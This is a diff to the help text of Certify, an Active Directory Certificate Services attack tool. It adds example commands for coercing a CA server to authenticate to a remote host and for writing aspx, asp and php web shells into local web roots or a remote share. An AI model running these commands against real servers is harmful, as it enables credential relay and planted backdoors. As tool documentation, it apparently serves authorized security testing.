@@ -105,6 +105,24 @@ Certify is a C# tool to enumerate and abuse misconfigurations in Active Director
       Download an already requested certificate:
 
         Certify.exe download /ca:SERVER\ca-name /id:X [/install] [/machine]
+        
+
+      Coerce the CA server to perform an authentication attempt to a remote host:
+
+        Certify.exe coerceauth /ca:SERVER\ca-name /target:Target
+
+
+      Write an aspx shell to a local web directory:
+
+        Certify.exe writefile /ca:SERVER\ca-name /path:C:\Windows\SystemData\CES\CA-Name\shell.aspx /input:C:\Local\Path\shell.aspx
+        
+      Write the default asp shell to a local web directory:
+
+        Certify.exe writefile /ca:SERVER\ca-name /path:c:\inetpub\wwwroot\shell.asp
+     
+      Write a php shell to a remote web directory:
+
+        Certify.exe writefile /ca:SERVER\ca-name /path:\\remote.server\share\shell.php /input:C:\Local\path\shell.php
 
 
 
